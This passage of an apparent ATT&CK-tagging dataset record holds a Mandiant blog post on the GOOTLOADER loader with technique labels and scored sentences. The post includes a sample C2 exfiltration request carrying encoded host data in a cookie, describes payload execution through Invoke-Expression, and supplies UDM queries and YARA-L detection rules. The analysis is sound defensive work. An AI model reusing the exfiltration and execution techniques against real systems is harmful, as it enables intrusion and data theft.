12345678903=DwxFwXG9220+H4sIAAAAAAAEAF2KQQrCMBBFrzI9gGLtDWxdCNIGqQeI8YODcaZMokXI4c3a1X+P99v5wYlcX5r2gvANEXRgqdarZNNIzgti9dPxmmAVznwzb4xUmu7/NCKvas9Kk2Aw/oA25GBJxde+H7HStEAGDe8XJJMzpLo+s8pW70tpdrNqTD9F+wIAlwAAABsMr3rFZrDa0g==;\n12345678904=DwxFwXG9220+H4sIAAAAAAAEAHOOM7YwMDM2NrI0sjAAAKRsSCYNAAAAGwyvesVmsNrS Host: example[.]com Connection: Close The contents of the HTTP Cookie header can be decoded using the CyberChef recipe below. The CyberChef recipe performs the following actions:\n- Decode the data from Base64 - Use regex to extract data from the gzip magic bytes (1F 8B) until the end (00) of the line - Decompress the result using Gunzip.\nFrom_Base64('A-Za-z0-9+/=',true,false) To_Hex('Space',0) Regular_expression('User defined','1f 8b.*(00)',true,true,false,false,false,false,'List matches') From_Hex('Auto') Gunzip() Figure 7: CyberChef recipe that decodes data 5. If the C2 responds to the GOOTLOADER.POWERSHELL request, then an additional payload is downloaded and executed using PowerShell’s Invoke-Expression cmdlet. Note that the C2 response must contain the host’s $unique_id in order for the command to execute. In some instances this response can occur several hours after the initial infection.\nIn the past the payload was FONELAUNCH, a .NET-based launcher that is written to the registry. However, in mid-2024 this has changed to a malicious DLL file that is executed using a renamed copy of rundll32.exe. In some instances this DLL file has been associated with CLEANBOOST, a backdoor malware.\nFurther steps in GOOTLOADER infections vary, but these initial compromises can lead to lateral movement in the environment followed by financially-motivated threat actor activity like ransomware deployment.\nThreat Hunting & Detection in Google SecOps Hunting Opportunities Mandiant Hunt surfaces otherwise undetected malicious activity by employing a detection strategy that uses both strong signals (high enough fidelity to be reviewed 1:1) and weak signals (low fidelity on their own but provide broad coverage of threat actor tactics) to enumerate attacker activity in customer environments. These signals are used to sequentially funnel petabytes of telemetry data to a practicable number of enriched and highly curated cases for analyst review. Mandiant uses security frameworks like MITRE ATT&CK® to help label data, find interesting sequences of activity, and share actionable results with customers.\nGoogle SecOps customers can use the following information to hunt for GOOTLOADER as well as other malicious activity using similar tactics:\n- Filewrite with suspicious extension to archive directory - Filewrites with these attributes may represent users extracting potentially-malicious files from archives. This is a common delivery mechanism for many malware families, including GOOTLOADER.\nUse the UDM query below in Google Security Operations to identify such exfiltration.\nUse the UDM query below in Google Security Operations to identify process events where wscript.exe launches cscript.exe to execute a non-VBScript file. While not necessarily malicious, this activity is uncommon in most environments and should be investigated to determine if it was legitimate.\nUse the UDM query below in Google Security Operations to identify PowerShell writing files with suspicious extensions to either the AppData\\\\Roaming or AppData\\\\Local\\\\Temp directories. The detection logic will likely find numerous innocuous events in your environment, so add exclusions to those already included at the bottom of the query to filter out the noise until interesting results remain. This activity is not exclusive to GOOTLOADER compromises; Mandiant has observed many malware families leveraging these directories to store malicious files.\n( metadata.event_type = \"FILE_CREATION\" OR metadata.event_type = \"FILE_MODIFICATION\" ) AND ( principal.process.file.full_path = /\\\\\\\\powershell\\\\.exe$/ nocase AND ( target.file.full_path = /\\\\\\\\AppData\\\\\\\\Roaming(\\\\\\\\[^\\\\\\\\\\\\/]+)?\\\\\\\\[^\\\\\\\\\\\\/]+\\\\.(svg|zip|rar|asp|png|jpg|iso|7z|html|doc|[A-Za-z]{5,8})$/ OR target.file.full_path = /\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\[^\\\\\\\\\\\\/]+\\\\.(svg|zip|rar|asp|jpg|iso|7z|doc)$/ ) AND ( principal.process.parent_process.file.full_path = /\\\\\\\\explorer\\\\.exe/ nocase OR principal.process.parent_process.file.full_path = /\\\\\\\\cmd\\\\.exe/ nocase OR principal.process.parent_process.file.full_path = /\\\\\\\\mshta\\\\.exe/ nocase OR principal.process.parent_process.file.full_path = /\\\\\\\\RuntimeBroker\\\\.exe/ nocase OR principal.process.parent_process.file.full_path = /\\\\\\\\WinRAR\\\\.exe/ nocase OR principal.process.parent_process.file.full_path = /\\\\\\\\sihost\\\\.exe/ nocase OR principal.process.parent_process.file.full_path = /\\\\\\\\Installer\\\\.exe/ nocase OR principal.process.parent_process.file.full_path = /\\\\\\\\cmd\\\\.exe/ nocase ) ) Google Security Operations Enterprise and Enterprise Plus customers will benefit from these detections being applied automatically through curated detections. Standard customers can use the YARA-L rules below to create single or multi-event rules to detect the malware. You can even ask Gemini in Google Security Operations to do it for you.\n- This rule detects the extraction of a GOOTLOADER js file to a Temp folder:\nrule gootloader_js_extract { meta:\nre.regex($e.file_path, `\\\\\\\\users\\\\\\\\.+\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\.+(_|\\\\s|\\\\()\\\\d{4,5}.?\\\\.zip.+\\\\.js$`) nocase and re.regex($e.principal.process.file.full_path, `explorer\\\\.exe`) nocase and $e.metadata.event_type = \"FILE_CREATION\" condition:\n$e } - This rule identifies the execution of GOOTLOADER malware from the Temp folder:\nrule gootloader_js_execute { meta:\nre.regex($e.target.process.command_line, `wscript\\\\.exe.+\\\\\\\\users\\\\\\\\.+\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\.+\\\\.js`) nocase or re.regex($e.principal.process.command_line, `wscript\\\\.exe.+\\\\\\\\users\\\\\\\\.+\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\.+\\\\.js`) nocase condition:\n$e } - This rule identifies the creation of a large .dat, .log, or .js file by wscript.exe:\nrule gootloader_second_stage_create { meta:\nre.regex($e.target.file.full_path, `\\\\\\\\users\\\\\\\\.+\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\.+\\\\.(js|log|dat)$`) nocase and $e.metadata.event_type = \"FILE_CREATION\" and re.regex($e.principal.process.file.full_path, `wscript`) nocase and $e.target.file.size >= 4000000 condition:\n$e } - This rule identifies the creation of a GOOTLOADER scheduled task that executes a .js file using its 8.3 filename:\nrule gootloader_task_create { meta:\n($e.metadata.event_type = \"SCHEDULED_TASK_CREATION\" or $e.metadata.event_type = \"SCHEDULED_TASK_MODIFICATION\") and re.regex($e.target.process.command_line, `(c|w)script(\\\\.exe)?(\"|\\\\s){1,3}[A-Z0-9]{6}~1\\\\.js`) nocase condition:\n$e } - This rule identifies the execution of a GOOTLOADER scheduled task that executes a .js file using its 8.3 filename:\nrule gootloader_task_execute { meta:\nre.regex($e.target.process.command_line, `(c|w)script\\\\.exe(\"|\\\\s){1,3}[A-Z0-9]{6}~1\\\\.js`) nocase or re.regex($e.principal.process.command_line, `(c|w)script\\\\.exe(\"|\\\\s){1,3}[A-Z0-9]{6}~1\\\\.js`) nocase condition:\n$e } Have questions or feedback for the Managed Defense team? Comment on the blog or ask a question in the Managed Defense Forum.",
+  "ID_list": [
+    "T1041",
+    "T1053",
+    "T1059",
+    "T1059.001",
+    "T1059.007",
+    "T1204",
+    "T1204.002"
+  ],
+  "Name_list": [
+    "Data Encoding",
+    "Execution",
+    "Exfiltration",
+    "Initial Access",
+    "Lateral Movement",
+    "Mshta",
+    "Persistence",
+    "PowerShell",
+    "Rundll32",
+    "Source"
+  ],
+  "TTP_sentences": {
+    "T1053": [
+      {
+        "sentence": "Welcome to the Finding Malware Series The \"Finding Malware\" blog series from Managed Defense is designed to empower the Google Security Operations community to detect emerging and persistent malware threats.",
+        "score": 0.3194
+      },
+      {
+        "sentence": "This post dives into the GOOTLOADER malware family and the detection opportunities available within the Google Security Operations (SecOps) platform.",
+        "score": 0.3093
+      },
+      {
+        "sentence": "About GOOTLOADER Also known as: SLOWPOUR, Gootkit Loader GOOTLOADER is an obfuscated JavaScript downloader which Mandiant has observed being distributed in multiple campaigns since 2021.",
+        "score": 0.3542
+      },
+      {
+        "sentence": "In such campaigns, victims are tricked via search engine optimization (SEO) poisoning into downloading archives from compromised websites.",
+        "score": 0.3044
+      },
+      {
+        "sentence": "These archives contain the GOOTLOADER malware, which users then extract and execute on hosts.",
+        "score": 0.3446
+      },
+      {
+        "sentence": "GOOTLOADER has been distributed by financially-motivated threat actors including UNC2565 as a means of initial access to an environment.",
+        "score": 0.3163
+      },
+      {
+        "sentence": "Mandiant Managed Defense has observed the constant evolution of the GOOTLOADER malware such as the addition of new payloads and obfuscation techniques.",
+        "score": 0.3487
+      },
+      {
+        "sentence": "Delivery In typical campaigns distributing GOOTLOADER, victims are lured into visiting compromised WordPress websites via SEO poisoning.",
+        "score": 0.3045
+      },
+      {
+        "sentence": "Figure 2: GOOTLOADER components The stages of the infection chain are explained in further detail below.",
+        "score": 0.3504
+      },
+      {
+        "sentence": "First Stage JavaScript Execution The extracted JavaScript is typically an open-source JavaScript library file, with the GOOTLOADER code embedded in it.",
+        "score": 0.3381
+      },
+      {
+        "sentence": "This technique aims to avoid detection by hiding an obfuscated JavaScript payload within a legitimate JavaScript library file.",
+        "score": 0.3673
+      },
+      {
+        "sentence": "The typical first stage process tree during an infection is as follows: explorer.exe ↳ \"C:\\\\Windows\\\\System32\\\\WScript.exe\" \"C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Local\\\\Temp\\\\<ZIP_FILE_NAME>.zip\\\\<JS_FILE_NAME>.js\" (Execution of the downloaded malware) Despite being obfuscated, it is possible to extract the malware configuration from the first stage .js file by leveraging this Python script as described in a previous blog.",
+        "score": 0.4512
+      },
+      {
+        "sentence": "Figure 3: Managed Defense’s Backscatter script allows VT Enterprise users to extract GOOTLOADER configurations using the Backscatter script.",
+        "score": 0.3149
+      },
+      {
+        "sentence": "Second Stage JavaScript Execution GOOTLOADER contains an obfuscated second stage payload that is decoded and saved to C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Roaming\\\\<RANDOM_DIRECTORY>\\\\<HARD_CODED_FILE_NAME> with a file extension of .dat or .log.",
+        "score": 0.4105
+      },
+      {
+        "sentence": "It is then renamed to .js.",
+        "score": 0.3069
+      },
+      {
+        "sentence": "These file names are hard-coded in the original .js script file, and the file is padded with 40-60MB of junk characters in order to increase its size and avoid detection.",
+        "score": 0.3983
+      },
+      {
+        "sentence": "A scheduled task is created in order to launch the second stage .js file.",
+        "score": 0.7631
+      },
+      {
+        "sentence": "The task serves as a form of persistence and a way to execute the second stage file for the first time.",
+        "score": 0.7063
+      },
+      {
+        "sentence": "The name of the scheduled task is hard-coded into the malware and usually includes business themes such as “Regulatory Communication” or “Motivated Operations”.",
+        "score": 0.8016
+      },
+      {
+        "sentence": "This PowerShell script performs the following steps (note that the script has been deobfuscated and its randomly-named functions/variables renamed to improve readability): 1.",
+        "score": 0.4371
+      },
+      {
+        "sentence": "The script Base64 encodes the collected information and compresses it using gzip before sending it to the C2 server.",
+        "score": 0.3653
+      },
+      {
+        "sentence": "Prior to Base64 encoding, the script adds hard-coded bytes to the beginning and end of the data (<bytes><gzip-Data><bytes>).",
+        "score": 0.3787
+      },
+      {
+        "sentence": "This serves as a form of obfuscation, making it challenging to decode the compressed information without prior knowledge of those specific bytes.",
+        "score": 0.3887
+      },
+      {
+        "sentence": "Note that Mandiant observed this additional obfuscation step in GOOTLOADER.POWERSHELL compromises beginning roughly in June 2024.",
+        "score": 0.4082
+      },
+      {
+        "sentence": "Previous versions of GOOTLOADER.POWERSHELL did not have this additional step.",
+        "score": 0.3326
+      },
+      {
+        "sentence": "Figure 6: data encoding function 4.",
+        "score": 0.3706
+      },
+      {
+        "sentence": "The gzip-encoded data along with a hard coded unique identifier ($unique_id) is placed in the HTTP Cookie header and sent through an HTTP GET request.",
+        "score": 0.3457
+      },
+      {
+        "sentence": "The CyberChef recipe performs the following actions: - Decode the data from Base64 - Use regex to extract data from the gzip magic bytes (1F 8B) until the end (00) of the line - Decompress the result using Gunzip.",
+        "score": 0.4275
+      },
+      {
+        "sentence": "From_Base64('A-Za-z0-9+/=',true,false) To_Hex('Space',0) Regular_expression('User defined','1f 8b.*(00)',true,true,false,false,false,false,'List matches') From_Hex('Auto') Gunzip() Figure 7: CyberChef recipe that decodes data 5.",
+        "score": 0.4491
+      },
+      {
+        "sentence": "If the C2 responds to the GOOTLOADER.POWERSHELL request, then an additional payload is downloaded and executed using PowerShell’s Invoke-Expression cmdlet.",
+        "score": 0.3255
+      },
+      {
+        "sentence": "Note that the C2 response must contain the host’s $unique_id in order for the command to execute.",
+        "score": 0.3268
+      },
+      {
+        "sentence": "These signals are used to sequentially funnel petabytes of telemetry data to a practicable number of enriched and highly curated cases for analyst review.",
+        "score": 0.3439
+      },
+      {
+        "sentence": "Google SecOps customers can use the following information to hunt for GOOTLOADER as well as other malicious activity using similar tactics: - Filewrite with suspicious extension to archive directory - Filewrites with these attributes may represent users extracting potentially-malicious files from archives.",
+        "score": 0.355
+      },
+      {
+        "sentence": "Use the UDM query below in Google Security Operations to identify such exfiltration. ( metadata.event_type = \"NETWORK_CONNECTION\" OR metadata.event_type = \"NETWORK_HTTP\" ) AND target.url = /Cookie:\\\\s[\\\\w=\\\\/+]{750,};/ - Suspicious Windows Script Host process execution - In GOOTLOADER compromises, execution of the second-stage payloads were performed by the Windows Script Host (WSH) binaries wscript.exe and cscript.exe.",
+        "score": 0.4479
+      },
+      {
+        "sentence": "These events map to MITRE ATT&CK Technique - Command and Scripting Interpreter: JavaScript.",
+        "score": 0.3061
+      },
+      {
+        "sentence": "Use the UDM query below in Google Security Operations to identify process events where wscript.exe launches cscript.exe to execute a non-VBScript file.",
+        "score": 0.3513
+      },
+      {
+        "sentence": "In some instances, the additional payloads included a portable executable and a DLL file, with obfuscated file names and extensions.",
+        "score": 0.3433
+      },
+      {
+        "sentence": "These events map to MITRE ATT&CK Technique - Command and Scripting Interpreter: PowerShell.",
+        "score": 0.3343
+      }
+    ],
+    "T1059": [
+      {
+        "sentence": "Welcome to the Finding Malware Series The \"Finding Malware\" blog series from Managed Defense is designed to empower the Google Security Operations community to detect emerging and persistent malware threats.",
+        "score": 0.3951
+      },
+      {
+        "sentence": "This post dives into the GOOTLOADER malware family and the detection opportunities available within the Google Security Operations (SecOps) platform.",
+        "score": 0.3704
+      },
+      {
+        "sentence": "You can read the other installments to the series here.",
+        "score": 0.4176
+      },
+      {
+        "sentence": "About GOOTLOADER Also known as: SLOWPOUR, Gootkit Loader GOOTLOADER is an obfuscated JavaScript downloader which Mandiant has observed being distributed in multiple campaigns since 2021.",
+        "score": 0.5226
+      },
+      {
+        "sentence": "In such campaigns, victims are tricked via search engine optimization (SEO) poisoning into downloading archives from compromised websites.",
+        "score": 0.398
+      },
+      {
+        "sentence": "These archives contain the GOOTLOADER malware, which users then extract and execute on hosts.",
+        "score": 0.5122
+      },
+      {
+        "sentence": "GOOTLOADER has been distributed by financially-motivated threat actors including UNC2565 as a means of initial access to an environment.",
+        "score": 0.3652
+      },
+      {
+        "sentence": "Successful GOOTLOADER infections have led to data exfiltration, extortion, and ransomware deployment, as highlighted in a CISA advisory from August 2024.",
+        "score": 0.3033
+      },
+      {
+        "sentence": "Mandiant Managed Defense has observed the constant evolution of the GOOTLOADER malware such as the addition of new payloads and obfuscation techniques.",
+        "score": 0.4756
+      },
+      {
+        "sentence": "This has likely been done by the malware authors as a way to evade detection.",
+        "score": 0.3974
+      },
+      {
+        "sentence": "Victims perform a search, often for business-related documents such as legal requirements, agreements, or contracts, and navigate to a compromised site with information purportedly related to their search.",
+        "score": 0.3421
+      },
+      {
+        "sentence": "Victims then download an archive containing the malware, and extract and execute the malicious JavaScript file.",
+        "score": 0.4595
+      },
+      {
+        "sentence": "Both the archive and the JavaScript file have names that closely resemble the victim's search query.",
+        "score": 0.3856
+      },
+      {
+        "sentence": "This naming scheme helps trick the user into extracting and executing the malware.",
+        "score": 0.3342
+      },
+      {
+        "sentence": "Figure 2: GOOTLOADER components The stages of the infection chain are explained in further detail below.",
+        "score": 0.4328
+      },
+      {
+        "sentence": "First Stage JavaScript Execution The extracted JavaScript is typically an open-source JavaScript library file, with the GOOTLOADER code embedded in it.",
+        "score": 0.4979
+      },
+      {
+        "sentence": "This technique aims to avoid detection by hiding an obfuscated JavaScript payload within a legitimate JavaScript library file.",
+        "score": 0.474
+      },
+      {
+        "sentence": "The typical first stage process tree during an infection is as follows: explorer.exe ↳ \"C:\\\\Windows\\\\System32\\\\WScript.exe\" \"C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Local\\\\Temp\\\\<ZIP_FILE_NAME>.zip\\\\<JS_FILE_NAME>.js\" (Execution of the downloaded malware) Despite being obfuscated, it is possible to extract the malware configuration from the first stage .js file by leveraging this Python script as described in a previous blog.",
+        "score": 0.5645
+      },
+      {
+        "sentence": "This capability is also available to VirusTotal Enterprise users under the Malware configuration file section.",
+        "score": 0.4354
+      },
+      {
+        "sentence": "Figure 3: Managed Defense’s Backscatter script allows VT Enterprise users to extract GOOTLOADER configurations using the Backscatter script.",
+        "score": 0.4453
+      },
+      {
+        "sentence": "Second Stage JavaScript Execution GOOTLOADER contains an obfuscated second stage payload that is decoded and saved to C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Roaming\\\\<RANDOM_DIRECTORY>\\\\<HARD_CODED_FILE_NAME> with a file extension of .dat or .log.",
+        "score": 0.5457
+      },
+      {
+        "sentence": "It is then renamed to .js.",
+        "score": 0.3904
+      },
+      {
+        "sentence": "These file names are hard-coded in the original .js script file, and the file is padded with 40-60MB of junk characters in order to increase its size and avoid detection.",
+        "score": 0.5023
+      },
+      {
+        "sentence": "A scheduled task is created in order to launch the second stage .js file.",
+        "score": 0.4851
+      },
+      {
+        "sentence": "The task serves as a form of persistence and a way to execute the second stage file for the first time.",
+        "score": 0.4964
+      },
+      {
+        "sentence": "The name of the scheduled task is hard-coded into the malware and usually includes business themes such as “Regulatory Communication” or “Motivated Operations”.",
+        "score": 0.4223
+      },
+      {
+        "sentence": "This PowerShell script performs the following steps (note that the script has been deobfuscated and its randomly-named functions/variables renamed to improve readability): 1.",
+        "score": 0.56
+      },
+      {
+        "sentence": "The script starts with a while loop that randomly selects 1 of 10 hard-coded URLs and passes it to the c2_connect function Figure 4: Initial PowerShell loop 2.",
+        "score": 0.4705
+      },
+      {
+        "sentence": "The c2_connect function acquires data about the host such as the operating system, environment variables, running processes, files/folders, and storage drives.",
+        "score": 0.3276
+      },
+      {
+        "sentence": "Figure 5: c2_connect function 3.",
+        "score": 0.4486
+      },
+      {
+        "sentence": "The script Base64 encodes the collected information and compresses it using gzip before sending it to the C2 server.",
+        "score": 0.4329
+      },
+      {
+        "sentence": "Prior to Base64 encoding, the script adds hard-coded bytes to the beginning and end of the data (<bytes><gzip-Data><bytes>).",
+        "score": 0.5424
+      },
+      {
+        "sentence": "This serves as a form of obfuscation, making it challenging to decode the compressed information without prior knowledge of those specific bytes.",
+        "score": 0.4925
+      },
+      {
+        "sentence": "Note that Mandiant observed this additional obfuscation step in GOOTLOADER.POWERSHELL compromises beginning roughly in June 2024.",
+        "score": 0.4616
+      },
+      {
+        "sentence": "Previous versions of GOOTLOADER.POWERSHELL did not have this additional step.",
+        "score": 0.4468
+      },
+      {
+        "sentence": "Figure 6: data encoding function 4.",
+        "score": 0.5462
+      },
+      {
+        "sentence": "The gzip-encoded data along with a hard coded unique identifier ($unique_id) is placed in the HTTP Cookie header and sent through an HTTP GET request.",
+        "score": 0.3826
+      },
+      {
+        "sentence": "The CyberChef recipe performs the following actions: - Decode the data from Base64 - Use regex to extract data from the gzip magic bytes (1F 8B) until the end (00) of the line - Decompress the result using Gunzip.",
+        "score": 0.5032
+      },
+      {
+        "sentence": "From_Base64('A-Za-z0-9+/=',true,false) To_Hex('Space',0) Regular_expression('User defined','1f 8b.*(00)',true,true,false,false,false,false,'List matches') From_Hex('Auto') Gunzip() Figure 7: CyberChef recipe that decodes data 5.",
+        "score": 0.547
+      },
+      {
+        "sentence": "If the C2 responds to the GOOTLOADER.POWERSHELL request, then an additional payload is downloaded and executed using PowerShell’s Invoke-Expression cmdlet.",
+        "score": 0.5526
+      },
+      {
+        "sentence": "Note that the C2 response must contain the host’s $unique_id in order for the command to execute.",
+        "score": 0.4347
+      },
+      {
+        "sentence": "In some instances this response can occur several hours after the initial infection.",
+        "score": 0.3071
+      },
+      {
+        "sentence": "However, in mid-2024 this has changed to a malicious DLL file that is executed using a renamed copy of rundll32.exe.",
+        "score": 0.326
+      },
+      {
+        "sentence": "In some instances this DLL file has been associated with CLEANBOOST, a backdoor malware.",
+        "score": 0.3023
+      },
+      {
+        "sentence": "Further steps in GOOTLOADER infections vary, but these initial compromises can lead to lateral movement in the environment followed by financially-motivated threat actor activity like ransomware deployment.",
+        "score": 0.303
+      },
+      {
+        "sentence": "Threat Hunting & Detection in Google SecOps Hunting Opportunities Mandiant Hunt surfaces otherwise undetected malicious activity by employing a detection strategy that uses both strong signals (high enough fidelity to be reviewed 1:1) and weak signals (low fidelity on their own but provide broad coverage of threat actor tactics) to enumerate attacker activity in customer environments.",
+        "score": 0.3252
+      },
+      {
+        "sentence": "These signals are used to sequentially funnel petabytes of telemetry data to a practicable number of enriched and highly curated cases for analyst review.",
+        "score": 0.4321
+      },
+      {
+        "sentence": "Mandiant uses security frameworks like MITRE ATT&CK® to help label data, find interesting sequences of activity, and share actionable results with customers.",
+        "score": 0.3525
+      },
+      {
+        "sentence": "Google SecOps customers can use the following information to hunt for GOOTLOADER as well as other malicious activity using similar tactics: - Filewrite with suspicious extension to archive directory - Filewrites with these attributes may represent users extracting potentially-malicious files from archives.",
+        "score": 0.3814
+      },
+      {
+        "sentence": "This is a common delivery mechanism for many malware families, including GOOTLOADER.",
+        "score": 0.3972
+      },
+      {
+        "sentence": "These events map to MITRE ATT&CK Technique - User Execution: Malicious File.",
+        "score": 0.3942
+      },
+      {
+        "sentence": "Some examples include: - C:\\\\Users\\\\<User>\\\\AppData\\\\Local\\\\Temp\\\\Legal_document_example_search_94721.zip\\\\legal document example search 90126.js - C:\\\\Users\\\\<User>\\\\AppData\\\\Local\\\\Temp\\\\fd3d6123-433a-4efb-a123-c43af0fa2f29_Legal_document_example_search(94721).zip.a58\\\\legal_document_example_search(90126).js Use the UDM query below in Google Security Operations to identify such file writes.",
+        "score": 0.3754
+      },
+      {
+        "sentence": "Use the UDM query below in Google Security Operations to identify such exfiltration. ( metadata.event_type = \"NETWORK_CONNECTION\" OR metadata.event_type = \"NETWORK_HTTP\" ) AND target.url = /Cookie:\\\\s[\\\\w=\\\\/+]{750,};/ - Suspicious Windows Script Host process execution - In GOOTLOADER compromises, execution of the second-stage payloads were performed by the Windows Script Host (WSH) binaries wscript.exe and cscript.exe.",
+        "score": 0.6029
+      },
+      {
+        "sentence": "In such compromises, the instance of cscript.exe launches a JavaScript file, which is an uncommon event in most environments.",
+        "score": 0.5634
+      },
+      {
+        "sentence": "These events map to MITRE ATT&CK Technique - Command and Scripting Interpreter: JavaScript.",
+        "score": 0.599
+      },
+      {
+        "sentence": "Use the UDM query below in Google Security Operations to identify process events where wscript.exe launches cscript.exe to execute a non-VBScript file.",
+        "score": 0.5434
+      },
+      {
+        "sentence": "In some instances, the additional payloads included a portable executable and a DLL file, with obfuscated file names and extensions.",
+        "score": 0.4837
+      },
+      {
+        "sentence": "These events map to MITRE ATT&CK Technique - Command and Scripting Interpreter: PowerShell.",
+        "score": 0.6002
+      },
+      {
+        "sentence": "Use the UDM query below in Google Security Operations to identify PowerShell writing files with suspicious extensions to either the AppData\\\\Roaming or AppData\\\\Local\\\\Temp directories.",
+        "score": 0.3494
+      },
+      {
+        "sentence": "The detection logic will likely find numerous innocuous events in your environment, so add exclusions to those already included at the bottom of the query to filter out the noise until interesting results remain.",
+        "score": 0.4131
+      },
+      {
+        "sentence": "Standard customers can use the YARA-L rules below to create single or multi-event rules to detect the malware.",
+        "score": 0.3124
+      },
+      {
+        "sentence": "Comment on the blog or ask a question in the Managed Defense Forum.",
+        "score": 0.3292
+      }
+    ],
+    "T1059.001": [
+      {
+        "sentence": "Welcome to the Finding Malware Series The \"Finding Malware\" blog series from Managed Defense is designed to empower the Google Security Operations community to detect emerging and persistent malware threats.",
+        "score": 0.388
+      },
+      {
+        "sentence": "This post dives into the GOOTLOADER malware family and the detection opportunities available within the Google Security Operations (SecOps) platform.",
+        "score": 0.3582
+      },
+      {
+        "sentence": "You can read the other installments to the series here.",
+        "score": 0.3823
+      },
+      {
+        "sentence": "About GOOTLOADER Also known as: SLOWPOUR, Gootkit Loader GOOTLOADER is an obfuscated JavaScript downloader which Mandiant has observed being distributed in multiple campaigns since 2021.",
+        "score": 0.4276
+      },
+      {
+        "sentence": "In such campaigns, victims are tricked via search engine optimization (SEO) poisoning into downloading archives from compromised websites.",
+        "score": 0.3877
+      },
+      {
+        "sentence": "These archives contain the GOOTLOADER malware, which users then extract and execute on hosts.",
+        "score": 0.5282
+      },
+      {
+        "sentence": "GOOTLOADER has been distributed by financially-motivated threat actors including UNC2565 as a means of initial access to an environment.",
+        "score": 0.37
+      },
+      {
+        "sentence": "Successful GOOTLOADER infections have led to data exfiltration, extortion, and ransomware deployment, as highlighted in a CISA advisory from August 2024.",
+        "score": 0.3239
+      },
+      {
+        "sentence": "Mandiant Managed Defense has observed the constant evolution of the GOOTLOADER malware such as the addition of new payloads and obfuscation techniques.",
+        "score": 0.4417
+      },
+      {
+        "sentence": "This has likely been done by the malware authors as a way to evade detection.",
+        "score": 0.3748
+      },
+      {
+        "sentence": "Victims perform a search, often for business-related documents such as legal requirements, agreements, or contracts, and navigate to a compromised site with information purportedly related to their search.",
+        "score": 0.3212
+      },
+      {
+        "sentence": "Victims then download an archive containing the malware, and extract and execute the malicious JavaScript file.",
+        "score": 0.4651
+      },
+      {
+        "sentence": "Both the archive and the JavaScript file have names that closely resemble the victim's search query.",
+        "score": 0.3094
+      },
+      {
+        "sentence": "Figure 2: GOOTLOADER components The stages of the infection chain are explained in further detail below.",
+        "score": 0.418
+      },
+      {
+        "sentence": "First Stage JavaScript Execution The extracted JavaScript is typically an open-source JavaScript library file, with the GOOTLOADER code embedded in it.",
+        "score": 0.4788
+      },
+      {
+        "sentence": "This technique aims to avoid detection by hiding an obfuscated JavaScript payload within a legitimate JavaScript library file.",
+        "score": 0.3912
+      },
+      {
+        "sentence": "The typical first stage process tree during an infection is as follows: explorer.exe ↳ \"C:\\\\Windows\\\\System32\\\\WScript.exe\" \"C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Local\\\\Temp\\\\<ZIP_FILE_NAME>.zip\\\\<JS_FILE_NAME>.js\" (Execution of the downloaded malware) Despite being obfuscated, it is possible to extract the malware configuration from the first stage .js file by leveraging this Python script as described in a previous blog.",
+        "score": 0.5997
+      },
+      {
+        "sentence": "This capability is also available to VirusTotal Enterprise users under the Malware configuration file section.",
+        "score": 0.42
+      },
+      {
+        "sentence": "Figure 3: Managed Defense’s Backscatter script allows VT Enterprise users to extract GOOTLOADER configurations using the Backscatter script.",
+        "score": 0.4646
+      },
+      {
+        "sentence": "Second Stage JavaScript Execution GOOTLOADER contains an obfuscated second stage payload that is decoded and saved to C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Roaming\\\\<RANDOM_DIRECTORY>\\\\<HARD_CODED_FILE_NAME> with a file extension of .dat or .log.",
+        "score": 0.4194
+      },
+      {
+        "sentence": "It is then renamed to .js.",
+        "score": 0.3671
+      },
+      {
+        "sentence": "These file names are hard-coded in the original .js script file, and the file is padded with 40-60MB of junk characters in order to increase its size and avoid detection.",
+        "score": 0.4248
+      },
+      {
+        "sentence": "A scheduled task is created in order to launch the second stage .js file.",
+        "score": 0.4455
+      },
+      {
+        "sentence": "The task serves as a form of persistence and a way to execute the second stage file for the first time.",
+        "score": 0.4461
+      },
+      {
+        "sentence": "The name of the scheduled task is hard-coded into the malware and usually includes business themes such as “Regulatory Communication” or “Motivated Operations”.",
+        "score": 0.3516
+      },
+      {
+        "sentence": "This PowerShell script performs the following steps (note that the script has been deobfuscated and its randomly-named functions/variables renamed to improve readability): 1.",
+        "score": 0.508
+      },
+      {
+        "sentence": "The script starts with a while loop that randomly selects 1 of 10 hard-coded URLs and passes it to the c2_connect function Figure 4: Initial PowerShell loop 2.",
+        "score": 0.467
+      },
+      {
+        "sentence": "The c2_connect function acquires data about the host such as the operating system, environment variables, running processes, files/folders, and storage drives.",
+        "score": 0.3289
+      },
+      {
+        "sentence": "Figure 5: c2_connect function 3.",
+        "score": 0.3721
+      },
+      {
+        "sentence": "The script Base64 encodes the collected information and compresses it using gzip before sending it to the C2 server.",
+        "score": 0.3634
+      },
+      {
+        "sentence": "Prior to Base64 encoding, the script adds hard-coded bytes to the beginning and end of the data (<bytes><gzip-Data><bytes>).",
+        "score": 0.4523
+      },
+      {
+        "sentence": "This serves as a form of obfuscation, making it challenging to decode the compressed information without prior knowledge of those specific bytes.",
+        "score": 0.3945
+      },
+      {
+        "sentence": "Note that Mandiant observed this additional obfuscation step in GOOTLOADER.POWERSHELL compromises beginning roughly in June 2024.",
+        "score": 0.3876
+      },
+      {
+        "sentence": "Previous versions of GOOTLOADER.POWERSHELL did not have this additional step.",
+        "score": 0.3644
+      },
+      {
+        "sentence": "Figure 6: data encoding function 4.",
+        "score": 0.4444
+      },
+      {
+        "sentence": "The gzip-encoded data along with a hard coded unique identifier ($unique_id) is placed in the HTTP Cookie header and sent through an HTTP GET request.",
+        "score": 0.305
+      },
+      {
+        "sentence": "The CyberChef recipe performs the following actions: - Decode the data from Base64 - Use regex to extract data from the gzip magic bytes (1F 8B) until the end (00) of the line - Decompress the result using Gunzip.",
+        "score": 0.4021
+      },
+      {
+        "sentence": "From_Base64('A-Za-z0-9+/=',true,false) To_Hex('Space',0) Regular_expression('User defined','1f 8b.*(00)',true,true,false,false,false,false,'List matches') From_Hex('Auto') Gunzip() Figure 7: CyberChef recipe that decodes data 5.",
+        "score": 0.4003
+      },
+      {
